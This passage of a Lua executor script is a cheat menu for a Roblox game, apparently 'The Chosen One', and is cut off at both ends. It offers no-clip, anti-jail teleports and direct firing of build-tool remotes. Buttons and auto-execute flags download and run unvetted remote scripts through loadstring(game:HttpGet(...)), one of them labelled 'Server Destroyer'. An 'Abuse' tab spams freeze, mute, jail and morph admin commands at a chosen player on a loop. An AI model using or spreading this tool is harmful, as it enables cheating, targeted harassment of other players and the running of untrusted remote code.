        pcall(function() SGS:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true) end)
    end
    LocalPlayer.CharacterAdded:Connect(function() restoreCamera() end)
    restoreCamera()
    print("[FIX VAMP] Camera + backpack restored")
end, CW, 46)

-- ============================================================
-- NO CLIP (VPLI -- new toggle)
-- Stepped: set all char parts CanCollide = false
-- ============================================================
local vpliNoClipConn = nil

createToggle(pgAnti, "👻  No Clip (VPLI)", function(v)
    if v then
        vpliNoClipConn = RunService.Stepped:Connect(function()
            local char = LocalPlayer.Character
            if char then
                for _, part in ipairs(char:GetDescendants()) do
                    if part:IsA("BasePart") and part.CanCollide then
                        part.CanCollide = false
                    end
                end
            end
        end)
    else
        if vpliNoClipConn then vpliNoClipConn:Disconnect(); vpliNoClipConn=nil end
        -- Restore collision
        local char = LocalPlayer.Character
        if char then
            for _, part in ipairs(char:GetDescendants()) do
                if part:IsA("BasePart") then part.CanCollide = true end
            end
        end
    end
end, CW, 46)

-- ============================================================
-- ANTI JAIL (original -- kept)
-- ============================================================
local lastOpenPos = nil

createToggle(pgAnti, "⛓  Anti Jail", function(v)
    if v then
        addConn("jail", RunService.Heartbeat:Connect(function()
            if math.random(1,20)~=1 then return end
            local char = LocalPlayer.Character; if not char then return end
            local hrp  = char:FindFirstChild("HumanoidRootPart"); if not hrp then return end
            local pos  = hrp.Position
            local rp   = RaycastParams.new()
            rp.FilterType = Enum.RaycastFilterType.Exclude
            local fx = {}
            for _, p in ipairs(Players:GetPlayers()) do
                if p.Character then table.insert(fx, p.Character) end
            end
            rp.FilterDescendantsInstances = fx
            local dirs  = {Vector3.new(1,0,0),Vector3.new(-1,0,0),Vector3.new(0,0,1),Vector3.new(0,0,-1)}
            local blocked = 0
            for _, d in ipairs(dirs) do
                if workspace:Raycast(pos, d*6, rp) then blocked=blocked+1 end
            end
            if blocked < 4 then
                lastOpenPos = pos
            else
                print("[ANTI JAIL] Jailed -- escaping")
                local parts = {}
                for _, p in ipairs(char:GetDescendants()) do
                    if p:IsA("BasePart") and p.CanCollide then
                        table.insert(parts, p); p.CanCollide=false
                    end
                end
                hrp.AssemblyLinearVelocity = Vector3.zero
                hrp.CFrame = CFrame.new(pos + Vector3.new(0,30,0))
                task.wait(0.1)
                hrp.CFrame = CFrame.new((lastOpenPos or Vector3.new(0,5,0)) + Vector3.new(0,5,0))
                for _, p in ipairs(parts) do pcall(function() p.CanCollide=true end) end
            end
        end))
    else
        killConn("jail"); lastOpenPos=nil
    end
end, CW, 46)



-- ============================================================
end -- close page 7

do -- page 8: PAGE 8: SCRIPTS
-- PAGE 8: SCRIPTS
-- ============================================================
createLabel(pgScripts, "  Scripts", Color3.fromRGB(80,80,120), 13)
createDivider(pgScripts)

-- Auto-execute flags (only run when codeXxmane is executed)
local autoExecVPLI  = false
local autoExecExtra = false

-- VPLI HUB V2 SERVER DESTROYER
createLabel(pgScripts, "  VPLI HUB V2 Server Destroyer", Color3.fromRGB(11,95,226), 13)
local vpliAutoToggle = createToggle(pgScripts, "⚡  Auto Execute (on load)", function(v)
    autoExecVPLI = v
end, CW, 38)

createButton(pgScripts, "▶  Execute VPLI Server Destroyer", function()
    task.spawn(function()
        pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/Adam3mka/The-chosen-one-lukaku/refs/heads/main/Protected_6361979247750901.txt"))()
        end)
    end)
end, CW, 46)

createDivider(pgScripts)

-- EXTRA STUFF UPDATED
createLabel(pgScripts, "  Extra Stuff Updated (2AREYOUMENTAL110)", Color3.fromRGB(11,95,226), 13)
local extraAutoToggle = createToggle(pgScripts, "⚡  Auto Execute (on load)", function(v)
    autoExecExtra = v
end, CW, 38)

createButton(pgScripts, "▶  Execute Extra Stuff", function()
    task.spawn(function()
        pcall(function()
            loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Lib-18698"))()
        end)
    end)
end, CW, 46)

createDivider(pgScripts)
createLabel(pgScripts, "  Auto execute runs scripts when codeXxmane loads", Color3.fromRGB(80,80,120), 11)

-- Run auto-executes on load
task.spawn(function()
    task.wait(2) -- wait for game to fully load
    if autoExecVPLI then
        pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/Adam3mka/The-chosen-one-lukaku/refs/heads/main/Protected_6361979247750901.txt"))()
        end)
    end
    if autoExecExtra then
        pcall(function()
            loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Lib-18698"))()
        end)
    end
end)

-- ============================================================
-- ============================================================
end -- close page 8

do -- page 9: PAGE 9: AUTO DONATE
-- PAGE 9: AUTO DONATE
-- Spams ;donate <player> <yourtime> -- interval adjustable
-- ============================================================
createLabel(pgDonate, "  Auto Donate", Color3.fromRGB(80,80,120), 13)
createLabel(pgDonate, "  Spams ;donate at your chosen interval", Color3.fromRGB(11,95,226), 11)
createDivider(pgDonate)

local donateTarget    = ""
local donateActive    = false
local donateThread    = nil
local donateInterval  = 5  -- default 5s

-- Target name input
local donateBox = createTextBox(pgDonate, "Player name to donate to...", CW, 36)
donateBox.ClearTextOnFocus = false
donateBox:GetPropertyChangedSignal("Text"):Connect(function()
    donateTarget = donateBox.Text
end)

-- Interval input -- numbers only
createLabel(pgDonate, "  Interval (seconds)", Color3.fromRGB(80,80,120), 12)
local donateIntervalBox = createTextBox(pgDonate, "5", CW, 34)
donateIntervalBox.ClearTextOnFocus = false
donateIntervalBox:GetPropertyChangedSignal("Text"):Connect(function()
    local clean = donateIntervalBox.Text:gsub("[^%d]", "")
    if donateIntervalBox.Text ~= clean then donateIntervalBox.Text = clean end
    local n = tonumber(clean)
    if n and n >= 1 then donateInterval = n end
end)

-- Get my current time stat (checks common stat names)
local function getMyTime()
    local ls  = LocalPlayer:FindFirstChild("leaderstats")
    if not ls then return nil end
    -- Common time stat names in The Chosen One
    local candidates = {"Time","Minutes","Seconds","Hours","Playtime","Score","Points"}
    for _, n in ipairs(candidates) do
        local s = ls:FindFirstChild(n)
        if s then return tostring(math.floor(tonumber(s.Value) or 0)) end
    end
    -- Fallback: return first int/numbervalue
    for _, v in ipairs(ls:GetChildren()) do
        if v:IsA("IntValue") or v:IsA("NumberValue") then
            return tostring(math.floor(tonumber(v.Value) or 0))
        end
    end
    return nil
end

-- Send chat using TextChatService (from Extra Stuff source)
local function sendChat(text)
    coroutine.wrap(function()
        pcall(function()
            game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(text)
        end)
    end)()
end

createToggle(pgDonate, "💸  Auto Donate ON/OFF", function(v)
    donateActive = v
    if v then
        if donateTarget == "" then
            print("[DONATE] Set a player name first!")
            donateActive = false
            return
        end
        donateThread = task.spawn(function()
            while donateActive do
                local myTime = getMyTime()
                if myTime and tonumber(myTime) and tonumber(myTime) > 0 then
                    local msg = ";donate " .. donateTarget .. " " .. myTime
                    sendChat(msg)
                    print("[DONATE] Sent: " .. msg)
                else
                    print("[DONATE] Could not read your time stat")
                end
                task.wait(donateInterval)
            end
        end)
    else
        if donateThread then task.cancel(donateThread); donateThread=nil end
        print("[DONATE] Stopped")
    end
end, CW, 46)

createButton(pgDonate, "💬  Send Once Now", function()
    local target = donateBox.Text
    if target == "" then print("[DONATE] No target set"); return end
    local myTime = getMyTime()
    if myTime then
        local msg = ";donate " .. target .. " " .. myTime
        sendChat(msg)
        print("[DONATE] Sent: " .. msg)
    else
        print("[DONATE] Could not read time stat")
    end
end, CW, 38)

-- ============================================================
end -- close page 9

do -- page 10: PAGE 10: ABUSE
-- PAGE 10: ABUSE
-- Targets a player -- spams admin commands at chosen interval
-- Abuse tab
-- ============================================================
createLabel(pgAbuse, "  Abuse", Color3.fromRGB(80,80,120), 13)
createLabel(pgAbuse, "  Spams commands on target at chosen interval", Color3.fromRGB(11,95,226), 11)
createDivider(pgAbuse)

local abuseTarget    = ""
local abuseActive    = false
local abuseThread    = nil
local abuseInterval  = 3  -- default 3s

-- Target input
local abuseBox = createTextBox(pgAbuse, "Target player name...", CW, 36)
abuseBox.ClearTextOnFocus = false
abuseBox:GetPropertyChangedSignal("Text"):Connect(function()
    abuseTarget = abuseBox.Text
end)

-- Interval input -- numbers only
createLabel(pgAbuse, "  Interval (seconds)", Color3.fromRGB(80,80,120), 12)
local abuseIntervalBox = createTextBox(pgAbuse, "3", CW, 34)
abuseIntervalBox.ClearTextOnFocus = false
abuseIntervalBox:GetPropertyChangedSignal("Text"):Connect(function()
    local clean = abuseIntervalBox.Text:gsub("[^%d]", "")
    if abuseIntervalBox.Text ~= clean then abuseIntervalBox.Text = clean end
    local n = tonumber(clean)
    if n and n >= 1 then abuseInterval = n end
end)

-- Find player by partial name
local function findPlayer(name)
    local lower = name:lower()
    for _, p in ipairs(Players:GetPlayers()) do
        if p.Name:lower():find(lower, 1, true)
        or p.DisplayName:lower():find(lower, 1, true) then
            return p
        end
    end
    return nil
end

-- Check if we have The Arkenstone tool
local function getEnlighten()
    local char = LocalPlayer.Character
    local tool = (char and char:FindFirstChild("The Arkenstone"))
             or LocalPlayer.Backpack:FindFirstChild("The Arkenstone")
    return tool
end

local function equipEnlighten()
    local tool = getEnlighten()
    if not tool then return false end
    if tool.Parent ~= LocalPlayer.Character then
        tool.Parent = LocalPlayer.Character
        task.wait(0.15)
    end
    return LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("The Arkenstone") ~= nil
end

-- The abuse sequence for one cycle
local abuseCmds = {
    function(n) sendChat(";freeze "  .. n) end,
    function(n) sendChat(";glitch "  .. n) end,
    function(n) sendChat(";mute "    .. n) end,
    function(n) sendChat(";jail "    .. n) end,
    function(n) sendChat(";morph "   .. n .. " dont1play2with3me") end,
}

local function runAbuseCycle(targetName)
    -- Check Enlighten
    local enli = getEnlighten()
    if not enli then
        print("[ABUSE] ⚠ The Arkenstone tool not found in backpack! Commands may not work.")
    else
        equipEnlighten()
        print("[ABUSE] ✓ The Arkenstone equipped")
    end

    for _, cmd in ipairs(abuseCmds) do
        if not abuseActive then break end
        pcall(function() cmd(targetName) end)
        task.wait(0.4)
    end
end

-- Abuse status label
local abuseStatusLbl = createLabel(pgAbuse, "  Status: Inactive", Color3.fromRGB(116,113,117), 12)

local function setAbuseStatus(txt, col)
    if abuseStatusLbl then
        abuseStatusLbl.Text = "  Status: " .. txt
        abuseStatusLbl.TextColor3 = col or Color3.fromRGB(116,113,117)
    end
    print("[ABUSE] " .. txt)
end

-- Start abuse loop (no rejoin detection)
local function startAbuse(name)
    if name == "" then
        setAbuseStatus("No target set!", Color3.fromRGB(255,80,80))
        return
    end

    abuseActive = true
    setAbuseStatus("Targeting: " .. name, Color3.fromRGB(11,95,226))

    abuseThread = task.spawn(function()
        while abuseActive do
            local target = findPlayer(name)
            if target then
                runAbuseCycle(target.Name)
            else
                setAbuseStatus("Target not in server: " .. name, Color3.fromRGB(255,180,0))
            end
            task.wait(abuseInterval)
        end
    end)
end

local function stopAbuse()
    abuseActive = false
    if abuseThread then task.cancel(abuseThread); abuseThread = nil end
    setAbuseStatus("Inactive", Color3.fromRGB(116,113,117))
end

createToggle(pgAbuse, "💀  Abuse ON/OFF", function(v)
    if v then
        startAbuse(abuseBox.Text)
    else
        stopAbuse()
    end
end, CW, 46)

-- Individual command buttons
createDivider(pgAbuse)
createLabel(pgAbuse, "  Manual Commands", Color3.fromRGB(80,80,120), 12)

createButton(pgAbuse, "🧊  Freeze",    function()
    local t = findPlayer(abuseBox.Text)
    if t then sendChat(";freeze " .. t.Name) end
end, CW, 36)
createButton(pgAbuse, "🌀  Glitch",    function()
    local t = findPlayer(abuseBox.Text)
    if t then sendChat(";glitch " .. t.Name) end
end, CW, 36)
createButton(pgAbuse, "🔇  Mute",      function()
    local t = findPlayer(abuseBox.Text)
    if t then sendChat(";mute " .. t.Name) end
end, CW, 36)
createButton(pgAbuse, "⛓  Jail",      function()
    local t = findPlayer(abuseBox.Text)
    if t then sendChat(";jail " .. t.Name) end
end, CW, 36)
createButton(pgAbuse, "👹  Morph (dont1play2with3me)", function()
    local t = findPlayer(abuseBox.Text)
    if t then sendChat(";morph " .. t.Name .. " dont1play2with3me") end
end, CW, 36)

-- Enlighten status check button
createDivider(pgAbuse)
createButton(pgAbuse, "🔦  Check Arkenstone Tool", function()
    local enli = getEnlighten()
    if enli then
        print("[ABUSE] ✓ The Arkenstone found: " .. enli.Parent.Name)
        setAbuseStatus("Arkenstone ✓ found in " .. enli.Parent.Name, Color3.fromRGB(11,95,226))
    else
        print("[ABUSE] ✗ The Arkenstone NOT found in character or backpack")
        setAbuseStatus("The Arkenstone NOT found!", Color3.fromRGB(255,80,80))
    end
end, CW, 38)

-- ============================================================
end -- close page 10

do -- page 11: PAGE 11: SAVE ENLIGHTEN
-- PAGE 11: SAVE ENLIGHTEN
-- Uses Classic Bucket gear (ID 25162389) to clone self
-- Detects if The Arkenstone tool is equipped before cloning
-- Method from Extra Stuff UPDATED source (gear me + SendAsync)
-- ============================================================
createLabel(pgSaveEnli, "  Save Arkenstone", Color3.fromRGB(80,80,120), 13)
createLabel(pgSaveEnli, "  Clones you using Bucket gear to save your Arkenstone", Color3.fromRGB(11,95,226), 11)
createDivider(pgSaveEnli)

-- Enlighten status display
local enliStatusLbl = createLabel(pgSaveEnli, "  Arkenstone: Not checked", Color3.fromRGB(116,113,117), 12)

local function getEnlightenTool()
    local char = LocalPlayer.Character
    return (char and char:FindFirstChild("The Arkenstone"))
        or LocalPlayer.Backpack:FindFirstChild("The Arkenstone")
end

local function setEnliStatus(txt, col)
    enliStatusLbl.Text      = "  Arkenstone: " .. txt
    enliStatusLbl.TextColor3 = col or Color3.fromRGB(116,113,117)
end

-- Check Enlighten button
createButton(pgSaveEnli, "🔦  Check Arkenstone Tool", function()
    local enli = getEnlightenTool()
    if enli then
        local loc = enli.Parent == LocalPlayer.Character and "Equipped ✓" or "In Backpack"
        setEnliStatus(loc, Color3.fromRGB(11, 200, 80))
        print("[SAVE ENLI] ✓ The Arkenstone found -- " .. loc)
    else
        setEnliStatus("NOT FOUND ✗", Color3.fromRGB(255, 60, 60))
        print("[SAVE ENLI] ✗ The Arkenstone NOT found in character or backpack!")
    end
end, CW, 38)

createDivider(pgSaveEnli)
createLabel(pgSaveEnli, "  Bucket Gear Clone", Color3.fromRGB(80,80,120), 12)
createLabel(pgSaveEnli, "  Runs: gear me 25162389 (Classic Bucket)", Color3.fromRGB(60,60,90), 11)

-- Core save function: check enli -> equip it -> give bucket gear -> clone
local function doSaveEnlighten()
    local enli = getEnlightenTool()
    if not enli then
        setEnliStatus("NOT FOUND -- equip The Arkenstone first! ✗", Color3.fromRGB(255, 60, 60))
        print("[SAVE ENLI] ✗ No The Arkenstone found! Equip it first.")
        return false
    end

    -- Make sure enlighten is equipped (in character, not backpack)
    if enli.Parent ~= LocalPlayer.Character then
        enli.Parent = LocalPlayer.Character
        task.wait(0.2)
    end
    setEnliStatus("Cloning...", Color3.fromRGB(11, 200, 80))
    print("[SAVE ENLI] Step 1 -- ;clone me")

    -- Step 1: ;clone me
    coroutine.wrap(function()
        pcall(function()
            game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(";clone me")
        end)
    end)()

    -- Step 2: wait 2 seconds
    task.wait(2)

    -- Step 3: ;gear me 25162389 (Classic Bucket steal)
    print("[SAVE ENLI] Step 2 -- ;gear me 25162389")
    coroutine.wrap(function()
        pcall(function()
            game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(";gear me 25162389")
        end)
    end)()

    setEnliStatus("Done ✓ (clone -> bucket)", Color3.fromRGB(11, 200, 80))
    print("[SAVE ENLI] ✓ Done -- clone sent, bucket gear given")
    return true
end

-- Save Arkenstone button
createButton(pgSaveEnli, "💡  SAVE ENLIGHTEN (Clone Me)", function()
    task.spawn(doSaveEnlighten)
end, CW, 50)

createDivider(pgSaveEnli)

-- Auto Save Arkenstone toggle (runs every 30s to keep clone fresh)
local autoSaveEnliActive = false
local autoSaveThread     = nil

createToggle(pgSaveEnli, "🔄  Auto Save Arkenstone (every 30s)", function(v)
    autoSaveEnliActive = v
    if v then
        autoSaveThread = task.spawn(function()
            while autoSaveEnliActive do
                doSaveEnlighten()
                task.wait(30)
            end
        end)
        print("[SAVE ENLI] Auto save ON")
    else
        if autoSaveThread then task.cancel(autoSaveThread); autoSaveThread = nil end
        setEnliStatus("Auto save stopped", Color3.fromRGB(116,113,117))
        print("[SAVE ENLI] Auto save OFF")
    end
end, CW, 42)

createLabel(pgSaveEnli, "  Tip: equip The Arkenstone first, then press Save", Color3.fromRGB(60,60,90), 11)

createDivider(pgSaveEnli)
createLabel(pgSaveEnli, "  Enlighten Stash", Color3.fromRGB(80,80,120), 13)
createLabel(pgSaveEnli, "  Builds your secret stash at saved coordinates", Color3.fromRGB(11,95,226), 11)

-- Stash JSON data (embedded from ENLIGHTEN STASH.json)
local STASH_DATA = {
    {a=true,p={-1015.5,12.5,-83.5},c={192,192,192},s={1,1,1},m="plastic",sp={},o="Plastic",cc=true},
    {a=true,p={-1020.5,11.5,-82.5},c={192,192,192},s={1,1,1},m="plastic",sp={},o="Plastic",cc=true},
    {a=true,p={-1021.5,11.5,-87.5},c={192,192,192},s={1,1,1},m="plastic",sp={},o="Plastic",cc=true},
    {a=true,p={-1021.5,15.5,-93.5},c={192,192,192},s={1,1,1},m="plastic",sp={},o="Plastic",cc=true},
    {a=true,p={-1020.5,20.5,-100.5},c={192,192,192},s={1,1,1},m="plastic",sp={},o="Plastic",cc=true},
    {a=true,p={-1020.5,25.5,-106.5},c={192,192,192},s={1,1,1},m="plastic",sp={},o="Plastic",cc=true},
    {a=true,p={-1020.5,25.5,-107.5},c={192,192,192},s={1,1,1},m="plastic",sp={},o="Plastic",cc=true},
    {a=true,p={-1015.5,12.5,-82.5},c={192,192,192},s={1,1,1},m="plastic",sp={},o="Plastic",cc=true},
    {a=true,p={-1015.5,13.5,-83.5},c={192,192,192},s={1,1,1},m="plastic",sp={},o="Plastic",cc=true},
    {a=true,p={-1014.5,12.5,-83.5},c={192,192,192},s={1,1,1},m="plastic",sp={},o="Plastic",cc=true},
    {a=true,p={903.5,132.5,713.5},c={192,192,192},s={1,1,1},m="plastic",sp={},o="Plastic",cc=true},
    {a=true,p={1192.5,106.5,869.5},c={192,192,192},s={1,1,1},m="plastic",sp={},o="Plastic",cc=true},
    {a=true,p={1204.5,109.5,873.5},c={192,192,192},s={1,1,1},m="plastic",sp={},o="Plastic",cc=true},
    {a=true,p={10204.5,1984.5,2431.5},c={192,192,192},s={1,1,1},m="plastic",sp={},o="Plastic",cc=true},
    {a=true,p={11995.5,2447.5,2542.5},c={192,192,192},s={12,1,14},m="plastic",sp={},o="Plastic",cc=true},
    {a=true,p={12007.5,2447.5,2542.5},c={192,192,192},s={12,1,14},m="plastic",sp={},o="Plastic",cc=true},
    {a=true,p={11995.5,2447.5,2556.5},c={192,192,192},s={12,1,14},m="plastic",sp={},o="Plastic",cc=true},
    {a=true,p={12007.5,2447.5,2556.5},c={192,192,192},s={12,1,14},m="plastic",sp={},o="Plastic",cc=true},
    {a=true,p={11995.5,2448.5,2542.5},c={192,192,192},s={1,8,28},m="plastic",sp={},o="Plastic",cc=true},
    {a=true,p={12018.5,2448.5,2542.5},c={192,192,192},s={1,8,28},m="plastic",sp={},o="Plastic",cc=true},
    {a=true,p={11996.5,2448.5,2569.5},c={192,192,192},s={22,8,1},m="plastic",sp={},o="Plastic",cc=true},
    {a=true,p={11996.5,2448.5,2542.5},c={192,192,192},s={22,8,1},m="plastic",sp={},o="Plastic",cc=true},
    {a=true,p={11981.5,2455.5,2542.5},c={192,192,192},s={14,1,28},m="plastic",sp={},o="Plastic",cc=true},
}

-- Compute stash center (average of all block positions) for TP
-- Stash room is the big structure at the end of the JSON
-- Floor: Y=2447, X~12007, Z~2556 -- hardcoded to actual room interior
local STASH_TP = Vector3.new(12007, 2455, 2556)

local stashBuilding  = false
local stashBuildWait = 0.15  -- default delay between blocks

local stashStatusLbl = createLabel(pgSaveEnli, "  Stash: Idle", Color3.fromRGB(116,113,117), 12)

local function setStashStatus(txt, col)
    stashStatusLbl.Text       = "  Stash: " .. txt
    stashStatusLbl.TextColor3 = col or Color3.fromRGB(116,113,117)
end

-- Slider: delay between each block (0.1s - 2s)
createSlider(pgSaveEnli, "Build Delay (sec)", 1, 20, 2, function(v)
    stashBuildWait = v / 10  -- slider 1-20 -> 0.1s-2.0s
end, CW)

-- Build Stash button
createButton(pgSaveEnli, "🏗  BUILD STASH", function()
    if stashBuilding then
        print("[STASH] Already building!")
        return
    end
    task.spawn(function()
        stashBuilding = true
        setStashStatus("Building... (0/" .. #STASH_DATA .. ")", Color3.fromRGB(255,180,0))

        local function equipBuild()
            local char = LocalPlayer.Character
            local tool = (char and char:FindFirstChild("Build"))
                      or LocalPlayer.Backpack:FindFirstChild("Build")
            if not tool then return nil end
            if tool.Parent ~= LocalPlayer.Character then
                tool.Parent = LocalPlayer.Character
                task.wait(0.1)
            end
            return LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Build")
        end

        local et = equipBuild()
        if not et then
            setStashStatus("Build tool not found!", Color3.fromRGB(255,60,60))
            stashBuilding = false
            return
        end

        for i, v in ipairs(STASH_DATA) do
            et = equipBuild()
            if not et then
                setStashStatus("Build tool lost at block " .. i, Color3.fromRGB(255,60,60))
                break
            end

            local pos = Vector3.new(v.p[1], v.p[2], v.p[3])

            -- Teleport near block so server accepts the build
            pcall(function()
                local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                if hrp then hrp.CFrame = CFrame.new(pos + Vector3.new(0, 6, 0)) end
            end)

            -- Fire build event (origevent first, fallback Script.Event)
            pcall(function()
                local ev = et:FindFirstChild("origevent")
                if ev then
                    ev:Invoke(workspace.Terrain, Enum.NormalId.Top, pos, "detailed")
                else
                    et.Script.Event:FireServer(workspace.Terrain, Enum.NormalId.Top, pos, "detailed")
                end
            end)

            setStashStatus("Building... (" .. i .. "/" .. #STASH_DATA .. ")", Color3.fromRGB(255,180,0))
            print("[STASH] Block " .. i .. "/" .. #STASH_DATA .. " at " .. tostring(pos))
            task.wait(stashBuildWait)
        end

        stashBuilding = false
        setStashStatus("Done ✓ (" .. #STASH_DATA .. " blocks)", Color3.fromRGB(11,200,80))
        print("[STASH] ✓ Build complete!")
    end)
end, CW, 46)

-- TP to Stash -- goes to actual room interior (X=12007, Y=2455, Z=2556)
createButton(pgSaveEnli, "📍  TP TO STASH", function()
    local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if hrp then
        hrp.CFrame = CFrame.new(STASH_TP)
        setStashStatus("Teleported ✓ -> " .. tostring(STASH_TP), Color3.fromRGB(11,200,80))
        print("[STASH] Teleported to stash: " .. tostring(STASH_TP))
    else
        print("[STASH] No character found")
    end
end, CW, 42)


-- ============================================================
end -- close page 11

do -- page 12: PAGE 12: BUILD SAVE/LOAD
-- PAGE 12: BUILD SAVE/LOAD (Extra Stuff bsaltab by 2AREYOUMENTAL110)
-- ============================================================

createLabel(pgAutoBuild, "  Build Save/Load", Color3.fromRGB(80,80,120), 13)
createLabel(pgAutoBuild, "  Saves builds to TheChosenOneBuilds/ folder", Color3.fromRGB(11,95,226), 11)
createLabel(pgAutoBuild, "  Note: toxify saved as neon | spray images unsupported | signs unsupported", Color3.fromRGB(160,100,0), 10)
createDivider(pgAutoBuild)

-- ── Shared state ─────────────────────────────────────────────
local http          = game:GetService("HttpService")
local StarterGui    = game:GetService("StarterGui")
local bs_stopped    = false
local bs_skipblock  = false
local bs_oldprt     = nil
local bs_mult       = 4  -- default block size (studs)
local bs_resizewait = 0.4
local bs_historymax = 400
local bs_cubehistory = {}
local bs_historynum = 0
local bs_offset     = Vector3.new(0,0,0)
local bs_novel      = false
local bs_wbs        = false  -- wait based on ping
local bs_savebuildname  = "Untitled"
local bs_savebuildnames = {}
local bs_selectedbuild  = nil  -- {name, data}
local bs_prttable   = nil
local bs_plrbuild   = nil
local bs_plrbuilds  = {ServerBuilds = workspace.Bricks}
local bs_plrnames   = {"ServerBuilds"}
local bs_hpb        = true

-- ── File helpers (executor APIs) ─────────────────────────────
local function bs_listfiles(dir)
    local ok, lf = pcall(function() return listfiles(dir) end)
    if ok and lf then
        for i,v in pairs(lf) do
            if string.sub(v,1,2) == "./" then lf[i] = string.sub(v,3) end
        end
        return lf
    end
    return {}
end

local function bs_getfn()
    local fn = bs_listfiles("TheChosenOneBuilds/")
    for i,v in pairs(fn) do
        fn[i] = v:gsub("TheChosenOneBuilds/",""):gsub("%.json","")
    end
    return fn
end

local bs_bannedsymbols = {[":"]="_",['"']="'",["|"]="-",["?"]="",["*"]="",["<"]="(",[">"]=")"}
local function bs_validate(name)
    for i,v in pairs(bs_bannedsymbols) do name = name:gsub(i,v) end
    name = name:gsub("%.","·")
    return name
end

-- init folder
pcall(function()
    local files = bs_listfiles("")
    if not table.find(files,"TheChosenOneBuilds/") and not table.find(files,"TheChosenOneBuilds") then
        makefolder("TheChosenOneBuilds")
    end
end)
pcall(function()
    local raw = readfile("thechosenonenames.txt")
    bs_savebuildnames = http:JSONDecode(raw)
end)
if bs_savebuildnames == nil then bs_savebuildnames = {} end

-- ── Materials table ──────────────────────────────────────────
local bs_materials = {}
bs_materials[Enum.Material.SmoothPlastic] = "smooth"
bs_materials[Enum.Material.Plastic]       = "plastic"
bs_materials[Enum.Material.CeramicTiles]  = "tiles"
bs_materials[Enum.Material.Brick]         = "bricks"
bs_materials[Enum.Material.WoodPlanks]    = "planks"
bs_materials[Enum.Material.Ice]           = "ice"
bs_materials[Enum.Material.Grass]         = "grass"
bs_materials[Enum.Material.Sand]          = "sand"
bs_materials[Enum.Material.Snow]          = "snow"
bs_materials[Enum.Material.Glass]         = "glass"
bs_materials[Enum.Material.Wood]          = "wood"
bs_materials[Enum.Material.Slate]         = "stone"
bs_materials[Enum.Material.Pebble]        = "pebble"
bs_materials[Enum.Material.Marble]        = "marble"
bs_materials[Enum.Material.Granite]       = "granite"
bs_materials[Enum.Material.DiamondPlate]  = "steel"
bs_materials[Enum.Material.Metal]         = "metal"
bs_materials[Enum.Material.Asphalt]       = "asphalt"
bs_materials[Enum.Material.Concrete]      = "concrete"
bs_materials[Enum.Material.Pavement]      = "pavement"
bs_materials[Enum.Material.Neon]          = "neon"
local bs_swapped = {}
for i,v in pairs(bs_materials) do bs_swapped[v] = i end

-- ── saveblock: serialise one BasePart ────────────────────────
local function bs_saveblock(bl)
    local bd = {}
    if bl:IsA("BasePart") then
        bd.p = {bl.Position.X, bl.Position.Y, bl.Position.Z}
        bd.c = {math.round(bl.Color.R*255), math.round(bl.Color.G*255), math.round(bl.Color.B*255)}
        bd.a = bl.Anchored
        bd.cc = bl.CanCollide
        if bl.Size.X ~= bs_mult or bl.Size.Y ~= bs_mult or bl.Size.Z ~= bs_mult then
            bd.p[1] = (bd.p[1] - (bl.Size.X/2)) + 0.5
            bd.p[2] = (bd.p[2] - (bl.Size.Y/2)) + 0.5
            bd.p[3] = (bd.p[3] - (bl.Size.Z/2)) + 0.5
            bd.s = {bl.Size.X, bl.Size.Y, bl.Size.Z}
        end
        bd.m = bs_materials[bl.Material]
        bd.o = bl.Material.Name
        bd.sp = {}
        for _,v in pairs(bl:GetChildren()) do
            if v.Name == "Spray" then
                local lbl = v:FindFirstChild("Label")
                local img = v:FindFirstChild("Image")
                table.insert(bd.sp, {v.Face.Name, img and img.Image or "", lbl and lbl.Text or ""})
            end
        end
    end
    return bd
end

-- ── buildblock: place a block via Build tool remotes ─────────
-- Track newly added bricks so we can paint them right after placing
local bs_lastPlaced = nil
pcall(function()
    local function bs_watchFolder(folder)
        folder.ChildAdded:Connect(function(child)
            if child:IsA("BasePart") then bs_lastPlaced = child end
        end)
    end
    if workspace.Bricks:FindFirstChild(LocalPlayer.Name) then
        bs_watchFolder(workspace.Bricks[LocalPlayer.Name])
    end
    workspace.Bricks.ChildAdded:Connect(function(child)
        if child.Name == LocalPlayer.Name then bs_watchFolder(child) end
    end)
end)

local function bs_fireBuildTool(pos, modeOrSize)
    local char = LocalPlayer.Character; if not char then return end
    local tool = char:FindFirstChild("Build") or LocalPlayer.Backpack:FindFirstChild("Build")
    if not tool then return end
    if tool.Parent ~= char then tool.Parent = char; task.wait(0.05) end
    tool = char:FindFirstChild("Build"); if not tool then return end
    local ev = tool:FindFirstChild("origevent")
    if ev then
        pcall(function() ev:Invoke(workspace.Terrain, Enum.NormalId.Top, pos, modeOrSize or "detailed") end)
    else
        local sc = tool:FindFirstChild("Script")
        if sc then
            local r = sc:FindFirstChild("Event")
            if r then pcall(function() r:FireServer(workspace.Terrain, Enum.NormalId.Top, pos, modeOrSize or "detailed") end) end
        end
    end
end

local function bs_buildblock(pos, mat, color, bsize, bsizev3, origmat, sprays, anchored, collide)
    local char = LocalPlayer.Character; if not char then return end
    local hrp  = char:FindFirstChild("HumanoidRootPart"); if not hrp then return end

    bs_lastPlaced = nil  -- reset tracker

    -- Resize if needed
    if bsizev3 then
        local sizeStr = "resize "..bsizev3.X.." "..bsizev3.Y.." "..bsizev3.Z
        bs_fireBuildTool(Vector3.new(99999,5000,99999), sizeStr)
        task.wait(bs_resizewait)
    end

    -- Place block
    bs_fireBuildTool(pos, "detailed")

    -- Wait for placement confirmation
    local placed = nil
    local t0 = tick()
    while tick()-t0 < 1.5 do
        if bs_lastPlaced and bs_lastPlaced.Parent then placed = bs_lastPlaced; break end
        task.wait(0.05)
    end
    -- fallback: find nearest brick to target pos
    if not placed then
        local myFolder = workspace.Bricks:FindFirstChild(LocalPlayer.Name)
        if myFolder then
            local bestDist = 8
            for _, v in pairs(myFolder:GetChildren()) do
                if v:IsA("BasePart") then
                    local d = (v.Position - pos).Magnitude
